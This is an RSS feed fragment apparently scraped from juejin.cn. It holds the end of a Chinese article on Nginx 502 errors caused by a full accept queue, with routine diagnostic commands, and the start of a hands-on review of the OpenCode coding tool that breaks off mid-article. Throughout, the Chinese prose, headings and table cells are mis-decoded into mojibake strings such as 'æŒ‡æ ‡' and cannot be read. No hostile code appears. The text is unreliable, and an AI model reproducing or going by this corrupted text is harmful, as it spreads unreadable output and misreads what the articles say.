<table><thead><tr><th>æŒ‡æ ‡</th><th>ä¼˜åŒ–å‰</th><th>ä¼˜åŒ–å</th></tr></thead><tbody><tr><td>502é”™è¯¯ç‡</td><td>5%</td><td>0.01%</td></tr><tr><td>accepté˜Ÿåˆ—æº¢å‡º</td><td>é¢‘ç¹</td><td>æ— </td></tr><tr><td>è¿æ¥å»ºç«‹æ—¶é—´</td><td>ä¸ç¨³å®š</td><td>ç¨³å®š&lt;5ms</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-16">æ’æŸ¥å‘½ä»¤æ±‡æ€»</h2>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># æŸ¥çœ‹Nginxé”™è¯¯æ—¥å¿—</span>
tail -f /var/<span class="hljs-keyword">log</span>/nginx/error.log

<span class="hljs-comment"># æŸ¥çœ‹è¿æ¥çŠ¶æ€</span>
ss -ant | <span class="hljs-keyword">grep</span> &lt;ç«¯å£&gt;

<span class="hljs-comment"># æŸ¥çœ‹ç›‘å¬é˜Ÿåˆ—</span>
ss -lnt | <span class="hljs-keyword">grep</span> &lt;ç«¯å£&gt;

<span class="hljs-comment"># æŸ¥çœ‹é˜Ÿåˆ—æº¢å‡ºç»Ÿè®¡</span>
netstat -s | <span class="hljs-keyword">grep</span> -i <span class="hljs-keyword">listen</span>

<span class="hljs-comment"># æŸ¥çœ‹ç³»ç»Ÿå‚æ•°</span>
sysctl net.core.somaxconn

<span class="hljs-comment"># å®æ—¶ç›‘æ§è¿æ¥æ•°</span>
watch -n <span class="hljs-number">1</span> <span class="hljs-string">'ss -ant | grep &lt;ç«¯å£&gt; | wc -l'</span>
</code></pre>
<hr/>
<h2 data-id="heading-17">ç»éªŒæ€»ç»“</h2>

























<table><thead><tr><th>502åŸå› </th><th>æ’æŸ¥æ–¹å‘</th></tr></thead><tbody><tr><td>upstream timed out</td><td>åç«¯å¤„ç†æ…¢æˆ–è¿æ¥é˜Ÿåˆ—æ»¡</td></tr><tr><td>connection refused</td><td>åç«¯æœåŠ¡æ²¡å¯åŠ¨</td></tr><tr><td>no live upstreams</td><td>æ‰€æœ‰åç«¯éƒ½ä¸å¯ç”¨</td></tr><tr><td>prematurely closed</td><td>åç«¯ä¸»åŠ¨æ–­å¼€è¿æ¥</td></tr></tbody></table>
<p><strong>è¿™æ¬¡çš„å‘</strong>ï¼šåç«¯æœåŠ¡çœ‹èµ·æ¥æ­£å¸¸ï¼Œä½†accepté˜Ÿåˆ—æ»¡äº†ï¼Œæ–°è¿æ¥è¿›ä¸æ¥ã€‚</p>
<p><strong>æ•™è®­</strong>ï¼š</p>
<ol>
<li>ç³»ç»Ÿé»˜è®¤çš„<code>somaxconn=128</code>å¤ªå°ï¼Œç”Ÿäº§ç¯å¢ƒå¿…é¡»è°ƒå¤§</li>
<li>Nginxé…ç½®<code>keepalive</code>å¯ä»¥å‡å°‘æ–°å»ºè¿æ¥ï¼Œé™ä½é˜Ÿåˆ—å‹åŠ›</li>
<li>ç›‘æ§è¦åŠ ä¸Šè¿æ¥é˜Ÿåˆ—æŒ‡æ ‡</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Claude Codeæœ€å¼ºå¼€æºå¯¹æ‰‹OpenCodeå®æµ‹ï¼šå…è´¹ä½¿ç”¨GLM-4.7/MiniMaxç­‰é«˜çº§æ¨¡å‹]]></title>    <link>https://juejin.cn/post/7592515924700561443</link>    <guid>https://juejin.cn/post/7592515924700561443</guid>    <pubDate>2026-01-08T03:22:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592515924700561443" data-draft-id="7592816646853918770" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Claude Codeæœ€å¼ºå¼€æºå¯¹æ‰‹OpenCodeå®æµ‹ï¼šå…è´¹ä½¿ç”¨GLM-4.7/MiniMaxç­‰é«˜çº§æ¨¡å‹"/> <meta itemprop="keywords" content="AIç¼–ç¨‹,Claude,Trae"/> <meta itemprop="datePublished" content="2026-01-08T03:22:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‰å¸½lufei"/> <meta itemprop="url" content="https://juejin.cn/user/501033035632093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Claude Codeæœ€å¼ºå¼€æºå¯¹æ‰‹OpenCodeå®æµ‹ï¼šå…è´¹ä½¿ç”¨GLM-4.7/MiniMaxç­‰é«˜çº§æ¨¡å‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/501033035632093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‰å¸½lufei
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:22:57.000Z" title="Thu Jan 08 2026 03:22:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"ğŸ‹"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"ğŸ“"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"ğŸ‘"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"ğŸ‰"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"ğŸ’"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>éƒ½è¯´ Claude Code çš„æœ€å¼ºå¼€æºå¯¹æ‰‹æ˜¯ OpenCodeï¼Œè¿™ä¹ˆç‰›é€¼çš„å¼€æºçš„é¡¹ç›®ï¼ŒClaude Code å› ä¸ºç”Ÿæ€å°é—­ï¼Œåªæ”¯æŒè‡ªå®¶æ¨¡å‹ï¼Œå›½å†…å°å·ä¸¥é‡ï¼Œä¸ªäººæ‹–å»¶ç—‡ç­‰ç­‰åŸå› ï¼Œåˆ°ç°åœ¨è¿˜æ²¡ç”¨è¿‡ï¼Œå°±å…ˆä½“éªŒä¸‹ OpenCodeï¼Œå¿«ä¸Šè½¦</p>
<h2 data-id="heading-1">ä¸€æ¢ç©¶ç«Ÿ</h2>
<p>ç›´æ¥åœ¨ github ä¸Šæœ opencode æ‰¾å®˜æ–¹åœ°å€,ä¸€ç›´åœ¨æ›´æ–°çš„æ„Ÿè§‰ï¼Œ52.5k star æ•°ï¼Œè¿™å¯å¤ªå¼ºäº†</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/591eb1934d474053aab1415ff096a85b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=gc6Yh9homjvsL1MYe58ejcoGcAo%3D" alt="image.png" loading="lazy"/></p>
<p>æ‰“å¼€å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopencode.ai%2F" target="_blank" title="https://opencode.ai/" ref="nofollow noopener noreferrer">opencode.ai/</a></p>
<p>è¿™ä¸ªå®˜æ–¹é¦–é¡µå°±éå¸¸æå®¢ï¼Œèµ›åšæœ‹å…‹çš„æ„Ÿè§‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d243543f21604debaf5e220e0a2d1141~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=w5B8Ko3NSB8wMQToy96NOj1%2F8qw%3D" alt="" loading="lazy"/></p>
<p>å…ˆä¸‹ä¸ªæ¡Œé¢ç«¯çœ‹çœ‹ï¼Œè¿™ä¸ªä¸‹è½½é¡µçœ‹åˆ°çš„logoï¼Œç§€å•Šï¼Œç®€å•çš„ä¸€ä¸ªOï¼Œè¡Œï¼Œå°±æ˜¯è¿™ä¹ˆç®€æ´ï¼Œç®€æ´è€Œä¸ç®€å•æ˜¯å§</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/572292887bfa4d1da09edf52665b5791~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=8JANVYnUUb%2Fx6iHc9WBnaKsGJ7I%3D" alt="" loading="lazy"/></p>
<p>å®‰è£…å®Œä»¥åæ‰“å¼€è¿™ä¸ªå·¥å…·çš„é¦–é¡µï¼Œé¢... æˆ‘æ€ä¹ˆæœ‰ä¸€ç§è¢«æ™ƒççš„æ„Ÿè§‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb0edf6d9abe44b688caf25978e2bdea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=p5DMGuAq7ygZM1%2BihY4Y0iIWw6w%3D" alt="" loading="lazy"/></p>
<p>éš¾é“ Claude Code å®¢æˆ·ç«¯å¼€å‘å·¥å…·çš„ä¹Ÿæ˜¯è¿™æ ·çš„è®¾è®¡é£æ ¼å—ï¼Ÿ</p>
<p>å†ç»†çœ‹ä¸€ä¸‹ï¼Œæœ‰ç§æ¯›éƒ½æ²¡æœ‰çš„æ„Ÿè§‰ï¼Œå†ç»†çœ‹å‘ç°æ•´ä½“è®¾è®¡çš„æ˜¯çœŸç®€æ´å•Šï¼Œæè‡´ç®€æ´</p>
<p>å·¦ä¸Šè§’ä¿©å°å›¾ï¼Œä¸€ä¸ªæ˜¯logoï¼Œä¸€ä¸ªæ˜¯ä¾§è¾¹æ ï¼Œæ‰“å¼€ä»¥åè¿˜æ˜¯æ¯›éƒ½æ²¡æœ‰ï¼Œlogoæ—è¾¹ä¹Ÿæ˜¯å…‰ç§ƒç§ƒçš„</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e321b2188da45248a5661a615dffd02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=T2jWtdsDoaiod%2FQNef2uY4yZQEM%3D" alt="" loading="lazy"/></p>
<p>è¿™å’Œå¸¸è§çš„ç¼–è¾‘å™¨å·¥å…·å·®è·æœ‰ç‚¹å¤§å•Šï¼Œå¼€å‘çš„ç›¸å…³ç¼–è¾‘å™¨å·¥å…·æˆ‘ä¹Ÿæ²¡å°‘ç”¨ï¼ŒæŠŠæˆ‘æ•´çš„æœ‰ç‚¹ä¸ä¼šäº†</p>
<p>ä¾§è¾¹æ å·¦ä¸‹è§’æœ‰ä¸ªæç¤ºï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯æœ‰å…è´¹æ¨¡å‹ï¼Œä¹Ÿèƒ½è‡ªå·±æ·»åŠ å…¶ä»–æ¨¡å‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01c768a1dfd44d9690883c7e65acb8eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=T%2FCFQWgievZ5wHUpThuuhyt9kEE%3D" alt="" loading="lazy"/></p>
<p>é¡µé¢ä¸Šå”¯ä¸€ä¸ªçœ‹èµ·æ¥æœ‰ç”¨çš„æŒ‰é’®ï¼Œå°±æ˜¯é‚£ä¸ª open project æŒ‰é’®äº†ï¼Œæ‰“å¼€é¡¹ç›®åï¼Œæ‰ç®—æ­£å¸¸äº†ç‚¹</p>
<p>æœ‰é¡¹ç›®åç§°å’Œåœ°å€ï¼Œä¸€ä¸ªå¯¹è¯æ¡†</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf928839c8a444b7a310b3726f0d417d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=OheKquauQ0qcXAn5v8PFCc8DMJE%3D" alt="" loading="lazy"/></p>
<p>å…¨é¡µé¢åˆæ˜¯ä¸€ä¸ªåªæœ‰ä¸€ä¸ªåœ°æ–¹çœ‹èµ·æ¥æœ‰ç”¨ï¼Œå°±æ˜¯é‚£ä¸ªä¸‡èƒ½çš„è¾“å…¥æ¡†äº†</p>
<p>è¾“å…¥æ¡†å·¦ä¾§åº•éƒ¨å°±ä¸‰ä¸ªèƒ½ç‚¹çš„åœ°æ–¹ï¼Œä»£ç†æ¨¡å¼ï¼Œæ¨¡å‹è®¾ç½®ï¼Œå“åº”é€Ÿåº¦ç±»å‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/725286733d134d7291959c9ab0304f55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=pyeb2aDW1UAlxD7QM8ZQRG2EMZw%3D" alt="" loading="lazy"/></p>
<p>å“‡å“¦ï¼Œè¿™ä¸ª Big Pickle é‡Œé¢çœ‹åˆ°çš„éƒ½æ˜¯å¥½ä¸œè¥¿å•Š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1bfb6e5683044b8693aad3f08d999950~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=iUFTLMfit%2B7RJhKNVUiLyNrTeWk%3D" alt="" loading="lazy"/></p>
<p>å›½å†…çš„ GLM-4.7 å’Œ MiniMax M2.1 ç«Ÿç„¶ä¹Ÿéƒ½å…è´¹ï¼Œè¿™ä¿©æ¨¡å‹æ­£å¸¸åœ¨å›½å†…ç”¨ï¼Œæ”¶è´¹è¿˜ä¸ä¾¿å®œå‘¢ï¼Œæ€ä¹ˆåšåˆ°çš„</p>
<p>è¿™å°å¼¹æ¡†é‡Œä¼¼ä¹å¯ä»¥æ¥å…¥æ‰€æœ‰çš„æ¨¡å‹ï¼Œè®¤è¯†çš„ä¸è®¤è¯†çš„ä¾›åº”å•†éƒ½å¯ä»¥æ¥å…¥</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad9c380f53134bd189f395c2487d7767~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=SORgk24gii5Z4HorVuHf4o6whgA%3D" alt="" loading="lazy"/></p>
<p>çœ‹åˆ°è¿™é‡Œï¼Œå°±ä¸å¾—ä¸å…³æ³¨ä¸€ä¸‹OpenCodeçš„èƒ½åŠ›äº†ï¼Œæˆ‘æ²¡ç”¨è¿‡ Claude Codeï¼ŒOpenCode åˆšä¸‹è½½å¼€å§‹ç”¨ï¼Œç›´æ¥é—®ä¸‹AIå§</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9c53932b0be49aeb02fd8391a4a3e14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=7RcSFCeP18FVXTNfpi7zYAvAHfE%3D" alt="" loading="lazy"/></p>
<p>ç»ˆäºçŸ¥é“æ”¯æŒå¤šå°‘å®¶æ¨¡å‹ä¾›åº”å•†äº†ï¼Œå“åº”å¼ç»ˆç«¯ï¼Œé«˜åº¦è‡ªå®šä¹‰ï¼Œè¿˜å…è´¹å†…ç½®é‚£ä¹ˆå¤šé«˜çº§æ¨¡å‹</p>
<blockquote>
<p>å“åº”å¼ç»ˆç«¯ UIï¼ˆResponsive Terminal User Interfaceï¼Œç®€ç§° TUIï¼‰æ˜¯æŒ‡åœ¨è®¡ç®—æœºç»ˆç«¯ï¼ˆå‘½ä»¤è¡Œçª—å£ï¼‰ä¸­è¿è¡Œï¼Œä¸”èƒ½åƒç°ä»£ç½‘é¡µæˆ–ç§»åŠ¨åº”ç”¨ä¸€æ ·å®æ—¶å“åº”çª—å£å¤§å°å˜åŒ–ã€æ”¯æŒå¤æ‚å¸ƒå±€ä»¥åŠå…·æœ‰å¼ºäº¤äº’æ€§çš„ç”¨æˆ·ç•Œé¢</p>
</blockquote>
<blockquote>
<p>è€è‰²æ‰¹ï¼ˆLSPï¼‰ï¼šè¯­è¨€æœåŠ¡å™¨åè®® ï¼ˆLanguage Server Protocolï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨ç¼–è¾‘å™¨æˆ–IDEä¸­å®ç°æ™ºèƒ½ä»£ç è¡¥å…¨ã€è¯­æ³•æ£€æŸ¥ã€è·³è½¬å®šä¹‰ç­‰åŠŸèƒ½çš„åè®®ã€‚å®ƒå®šä¹‰äº†å®¢æˆ·ç«¯ï¼ˆå¦‚ç¼–è¾‘å™¨ï¼‰å’ŒæœåŠ¡å™¨ï¼ˆå¦‚è¯­è¨€æœåŠ¡å™¨ï¼‰ä¹‹é—´çš„é€šä¿¡æ¥å£ï¼Œä½¿ä¸åŒçš„å¼€å‘å·¥å…·èƒ½å¤Ÿä¸ä¸åŒçš„ç¼–ç¨‹è¯­è¨€è¿›è¡Œäº¤äº’ã€‚</p>
</blockquote>
<h2 data-id="heading-2">å®æˆ˜ä½¿ç”¨</h2>
<p>åƒæˆ‘è¿™ç§ç»´æŠ¤ä¸€å †é¡¹ç›®çš„ç‰›é©¬ï¼Œç›´æ¥æ‹¿é¡¹ç›®ä¸Šçš„çœŸå®éœ€æ±‚å…ˆç”¨ä¸€ä¸‹ï¼Œå’±ä¹Ÿæ²¡ç©ºå¼„é‚£äº›ä»0åˆ°1å®ç°ä¸ªä»€ä¹ˆç‰¹è‰²é¡¹ç›®ä¹‹ç±»çš„ï¼Œäº¤ä¸ªå¤§ä½¬ä»¬å»ç”¨å§ï¼Œå…ˆæŠŠæ¯å¤©çš„æ´»å„¿ç»™å¹²äº†å†è¯´</p>
<p>ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªç¥–ä¼ å°ç¨‹åºé¡¹ç›®çš„ä¸€ä¸ªé¡µé¢ï¼Œæˆ‘ç›´æ¥ç”¨ OpenCode æ¥å®ç°ä¸€ä¸‹ï¼Œåœ¨æˆªå›¾æ ‡è®°çš„åœ°æ–¹ï¼Œæ·»åŠ ä¸€ä¸ªæ–°å¡ç‰‡ï¼Œæ‰“å¼€ä¸€ä¸ªç¬¬ä¸‰æ–¹é¡µé¢ï¼Œé¡¹ç›®ä¸­æ²¡æœ‰å®ç°è¿‡è·³ç¬¬ä¸‰æ–¹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcd685a8125d4085811f3eba8b5ef3a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447377&amp;x-signature=D9dkLXLRnkSOdasfSNfHHubH6MQ%3D" alt="" loading="lazy"/></p>
